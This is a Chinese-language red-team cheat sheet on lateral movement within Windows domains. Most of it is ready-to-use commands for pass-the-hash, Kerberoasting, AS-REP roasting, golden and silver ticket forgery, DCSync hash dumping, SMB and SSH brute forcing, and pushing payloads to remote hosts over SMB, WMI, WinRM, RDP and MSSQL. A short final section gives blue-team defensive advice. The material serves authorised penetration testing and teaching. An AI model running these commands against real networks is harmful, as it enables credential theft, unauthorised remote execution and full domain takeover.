# 横向移动技术（内域网内移动）

> 拿下一台内网主机后，如何"横向"渗透到同网段其他主机？横向移动（Lateral Movement）是内网渗透的核心环节。本文档梳理常见协议的利用方式。

## 1. 横向移动的基本思路

横向移动依赖三个要素：
- **凭据**：账号密码、NTLM 哈希、Kerberos TGT / ST、SSH Key
- **通道**：SMB / WMI / WinRM / RDP / SSH / PsExec / DCOM 等
- **目标**：同网段存活主机、服务端口、域名解析

### 1.1 常用工具

| 用途 | 代表工具 |
|------|---------|
| 主机 / 端口探测 | `nmap`、`masscan`、`arp-scan`、`netdiscover`、`fscan`、`kscan` |
| 凭据窃取 | `mimikatz`、`procdump`、`LaZagne`、`Impacket-secretsdump` |
| 命令执行 | `PsExec`、`wmiexec.py`、`smbexec.py`、`psexec.py`、`winrs`、`evil-winrm`、`ssh` |
| 文件传输 | `smbclient`、`xcopy`、`certutil`、`bitsadmin`、`curl` |
| 哈希传递 / 票据 | `Impacket`、`Rubeus`、`mimikatz`、`BloodHound` |
| 域内态势感知 | `BloodHound`、`SharpHound`、`Powerview.ps1`、`ADSearch.exe` |

### 1.2 横向移动路径的总体地图

```
初始跳板 (一台已控主机)
  |-- 信息收集 (arp / net view / nbtscan / DNS) → 发现同网段主机
  |-- 凭据收集 (mimikatz / secretsdump) → 本地管理员凭据、域凭据
  |-- Pass-the-Hash / Pass-the-Ticket → 使用凭据跨主机
  |-- PsExec / WMI / WinRM / RDP / SSH → 远程执行命令
  |-- 下载 / 上传 payload → 文件传输
  |-- 凭据导出 → 继续横向
  └-- 最终目标：域控 / 核心业务系统
```

## 2. Pass-the-Hash (PtH)：使用 NTLM 哈希直接登录

拿到目标账户的 NTLM 哈希后，无需破解明文密码即可用于登录：

```bash
# psexec.py - Pass-the-Hash 直接获取交互式 shell
impacket-psexec domain/admin@10.0.0.10 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# wmiexec.py - 通过 WMI 执行命令（不需要服务，流量更隐蔽）
impacket-wmiexec domain/admin@10.0.0.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c

# smbexec.py - 通过 SMB 协议执行命令
impacket-smbexec domain/admin@10.0.0.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c

# dcomexec.py - 通过 DCOM 执行
impacket-dcomexec -object MMC20 domain/admin@10.0.0.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c

# evil-winrm - 通过 WinRM 进行远程管理（Windows 常用远程协议）
evil-winrm -i 10.0.0.10 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c

# Windows 原生工具 + mimikatz
mimikatz # sekurlsa::pth /user:admin /domain:target /ntlm:8846f7eaee8fb117ad06bdd830b7586c
# 之后当前会话即可通过 \target\C$ 访问，或执行 psexec 无需密码
```

## 3. Kerberos 协议下的横向技术

### 3.1 Kerberoasting：从服务票据恢复服务账户密码

思路：域内任意用户可请求**SPN（Service Principal Name）**关联服务账户的 TGS-REP。TGS-REP 用服务账户明文密码的 NTLM 哈希加密，可离线破解。

```powershell
# PowerView / Rubeus
# 1. 查找 SPN 关联的用户
Get-NetUser -SPN | select serviceprincipalname
# 2. 请求服务票据并导出
Rubeus.exe kerberoast /outfile:kerberoast.txt
# 3. 使用 hashcat 离线破解
hashcat -m 13100 kerberoast.txt wordlist.txt -O
```

### 3.2 AS-REP Roasting：无凭据也能攻击预认证禁用的账户

域中若存在**设置了 DONT_REQ_PREAUTH 的账户**（即不要求 Kerberos 预认证），攻击者可直接向 KDC 请求该账户的 AS-REP 并离线爆破其密码。

```bash
# Impacket 远程爆破（需知道用户名列表）
impacket-GetNPUsers target.com/ -format hashcat -outputfile asrep.txt -usersfile users.txt

# 或使用 Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# 破解
hashcat -m 18200 asrep.txt wordlist.txt
```

### 3.3 Golden Ticket / Silver Ticket

```bash
# Golden Ticket（伪造 TGT，访问任意服务）
# 需 KRBTGT NTLM 哈希（通过 DCSync 或 ntds.dit 提取）
impacket-ticketer -nthash <krbtgt hash> -domain-sid <DOMAIN SID> -domain target.com administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass dc.target.com

# Silver Ticket（伪造 TGS，访问特定服务如 CIFS/dc.target.com）
impacket-silver -k -nthash <service account hash> -sid <SID> -target target.com -spn CIFS/dc.target.com administrator
```

### 3.4 Pass-the-Ticket (PtT)

```bash
# 使用 .kirbi 票据文件
export KRB5CCNAME=/tmp/ticket.ccache
impacket-wmiexec -k -no-pass -dc-ip 10.0.0.1 target.com/admin@dc.target.com

# Windows 下 mimikatz
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;12345]-0-0-40810000-admin@cifs-server.kirbi
# 之后访问 \\server\C$ 即可
```

### 3.5 DCSync：从域控拉取所有账户密码哈希

当拿到域管理员权限或具有 `DS-Replication-Get-Changes*` 权限时：

```bash
# 使用 Impacket DCSync 拉取所有账户哈希
impacket-secretsdump target.com/admin:password@10.0.0.1 -just-dc

# mimikatz
mimikatz # lsadump::dcsync /domain:target.com /user:krbtgt
```

## 4. 基于协议的横向移动

### 4.1 SMB (445)：最常用的横向通道

```bash
# 匿名 / 访客访问
smbclient -L //10.0.0.10 -N
crackmapexec smb 10.0.0.0/24 --shares

# SMB 登录执行命令（psexec 变种）
impacket-psexec 'admin:Password1!@10.0.0.10'
impacket-smbexec 'admin:Password1!@10.0.0.10'
impacket-atexec 'admin:Password1!@10.0.0.10' "whoami"   # 通过任务计划服务

# crackmapexec 批量扫 SMB 弱口令
crackmapexec smb 10.0.0.0/24 -u users.txt -p passwords.txt --continue-on-success

# 文件传输
smbclient //10.0.0.10/C$ -U "admin%Password1!" -c "put payload.exe"
```

### 4.2 WMI (135 + 动态端口)：WMIEXEC / wmic

```bash
# Impacket wmiexec - 最常用的 WMI 执行工具
impacket-wmiexec 'admin:Password1!@10.0.0.10'
impacket-wmiexec -hashes :ntlm_hash 'admin@10.0.0.10'

# Windows 原生
wmic /node:10.0.0.10 /user:admin /password:Password1! process call create "cmd.exe /c whoami > C:\out.txt"
```

### 4.3 WinRM / PSRemoting (5985 / 5986)

```bash
# evil-winrm
evil-winrm -i 10.0.0.10 -u admin -p 'Password1!'
evil-winrm -i 10.0.0.10 -u admin -H 'NTLM_hash'

# PowerShell 原生
$cred = Get-Credential
Enter-PSSession -ComputerName 10.0.0.10 -Credential $cred
Invoke-Command -ComputerName 10.0.0.10 -ScriptBlock { whoami } -Credential $cred
```

### 4.4 RDP (3389)

```bash
# xfreerdp / rdesktop 登录
xfreerdp /u:admin /p:Password1! /v:10.0.0.10 /cert:ignore +clipboard

# Pass-the-Hash 登录 RDP（Restricted Admin Mode 需目标允许）
xfreerdp /u:admin /pth:ntlm_hash /v:10.0.0.10

# RDP 会话劫持（需本地 SYSTEM 权限）
# tscon 1 /dest:console  或  quser + tscon
```

### 4.5 SSH / SCP (22)

```bash
# SSH Key 登录
ssh -i id_rsa user@10.0.0.10
scp payload.exe user@10.0.0.10:/tmp/

# 密码登录
hydra -L users.txt -P passwords.txt ssh://10.0.0.10
```

### 4.6 DCOM (135)

```bash
# Impacket dcomexec
impacket-dcomexec -object MMC20 'admin:Password1!@10.0.0.10'
impacket-dcomexec -object ShellBrowserWindow 'admin:Password1!@10.0.0.10'
```

### 4.7 MSSQL (1433) / MySQL (3306)

```bash
# MSSQL xp_cmdshell
impacket-mssqlclient 'sa:Password1!@10.0.0.10' -windows-auth
# SQL 交互窗口
# > enable_xp_cmdshell
# > xp_cmdshell whoami

# MySQL UDF / 写文件
mysql -u root -p -h 10.0.0.10
```

## 5. 内网探测与拓扑发现

### 5.1 存活主机探测

```bash
# ARP 扫描（二层）
arp-scan --localnet
netdiscover -r 10.0.0.0/24

# ICMP 扫描
for i in $(seq 1 254); do (ping -c 1 -W 1 10.0.0.$i >/dev/null && echo 10.0.0.$i); done &

# fscan（综合扫描器）
./fscan -h 10.0.0.0/24

# crackmapexec 服务探测
crackmapexec smb 10.0.0.0/24
```

### 5.2 BloodHound 域态势感知

```powershell
# SharpHound 收集数据
SharpHound.exe -c all --zipfilename blood.zip

# 导入到 BloodHound 客户端进行可视化分析
# 常见查询：
#   - Shortest Path to Domain Admins
#   - Computers where Domain Admin has session
#   - Kerberoastable Users
```

## 6. Windows 原生协议命令速查

```cmd
# 列出远程主机文件
dir \\10.0.0.10\C$

# 复制文件到远程
copy payload.exe \\10.0.0.10\C$\Windows\Temp\

# 查看远程主机上的会话
net use \\10.0.0.10\IPC$ "Password1!" /user:admin
net view \\10.0.0.10

# 查看远程主机登录用户
quser /server:10.0.0.10

# 查看远程主机时间
net time \\10.0.0.10

# 查询远程主机 open session
net session \\10.0.0.10

# 查看远程主机共享
net view /domain
```

## 7. 蓝队防御建议

1. **限制 LLMNR / NBT-NS**：关闭 Link-Local 多播名称解析，使用 DNS 名称解析，防止 `Responder` 哈希投毒
2. **禁用 NTLM 认证**：在域内强推 Kerberos，禁用 NTLM v1 / v2
3. **本地管理员密码 LAPS**：每台机器本地管理员密码独立，防止一密横扫全网
4. **防护凭据**：LSA Protected (`RunAsPPL`)、Credential Guard、禁用 WDigest
5. **限制敏感账户登录范围**：域管理员 / 服务账户禁止登录普通工作站（通过"登录到..."限制）
6. **监控横向移动流量**：445 / 3389 / 5985 / 135 端口异常流量
7. **AD 权限审计**：定期使用 BloodHound 识别危险 ACL 配置

---

> 横向移动是内网渗透中最体现"战术"的一环。凭据是横向移动的血液，协议是横向移动的血管。实战中往往需要组合多种技术、避开 EDR 和流量监控。本指南仅用于合法授权的红队演练与企业安全审计。
